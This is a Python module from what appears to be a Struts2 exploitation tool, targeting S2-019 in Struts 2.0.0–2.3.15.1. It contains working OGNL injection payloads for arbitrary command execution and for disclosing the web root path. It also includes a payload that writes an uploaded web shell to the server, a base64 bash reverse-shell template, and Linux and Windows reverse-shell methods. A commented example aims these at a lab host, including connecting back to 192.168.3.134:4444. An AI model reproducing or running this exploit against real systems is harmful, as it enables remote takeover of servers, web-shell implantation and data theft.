from exploit import tools
import urllib.parse

class S2_019:
    """S2-019漏洞检测利用类"""
    info = "[+] S2-019:影响版本Struts 2.0.0-2.3.15.1; GET请求发送数据; 支持获取WEB路径,任意命令执行,反弹Windows,Linux shell和文件上传"
    web_path = "%23req%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')%2C%23resp%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C%23resp.setCharacterEncoding('{encoding}')%2C%23resp.getWriter().println(%23req.getSession().getServletContext().getRealPath('%2F'))%2C%23resp.getWriter().flush()%2C%23resp.getWriter().close()"
    exec_payload = "%23f%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23resp%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B{cmd}%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B1000%5D%2C%23d.read(%23e)%2C%23resp.println(%23e)%2C%23resp.close()"
    upload_payload = r"""debug=command&expression=%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.getWriter().print(%22O%22),%23res.getWriter().print(%22K%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%22{path}%22)).append(%23req.getParameter(%22shell%22)).close()&shell={shell}"""
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        self.headers = tools.parser_headers(headers)
        self.encoding = encoding
        self.is_vul = False
        if 'Content-Type' not in self.headers:
            self.headers['Content-Type'] = 'application/x-www-form-urlencoded'

    def check(self):
        """检测漏洞是否存在"""
        html = tools.echo_check(self)
        if str(html).startswith("ERROR:"):
            return html
        if html:
            self.is_vul = True
            return 'S2-019'
        return self.is_vul

    def get_path(self):
        """获取web目录"""
        html = tools.get(self.url + "?debug=command&expression={payload}".format(
            payload=self.web_path.format(encoding=self.encoding)), self.headers, self.encoding)
        return html

    def exec_cmd(self, cmd):
        """执行命令"""
        cmd = tools.parser_cmd(cmd)
        html = tools.get(
            self.url + "?debug=command&expression={payload}".format(payload=self.exec_payload.format(cmd=urllib.parse.quote(cmd))),
            self.headers, self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = tools.reverse_shell(self, ip, port)
        return html

    def reverse_shell_win(self, ip, port):
        """windows 反弹shell"""
        html = tools.reverse_shell_win(self, ip, port)
        return html

    def upload_shell(self, upload_path, shell_path):
        shell = tools.read_file(shell_path, self.encoding)
        data = self.upload_payload.format(path=urllib.parse.quote(upload_path), shell=urllib.parse.quote(shell))
        html = tools.post(self.url, data, self.headers, self.encoding)
        if html == 'OK':
            return True
        else:
            return False

# if __name__ == '__main__':
#     s = S2_019("http://192.168.217.138:8080/S2-019/example/HelloWorld.action")
#     print(s.get_path())
#     print(s.check())
#     print(s.exec_cmd('whoami'))
#     s.reverse_shell('192.168.3.134', '4444')
#     print(s.upload_shell('/usr/local/tomcat/webapps/ROOT/shell.jsp', 'shell.jsp'))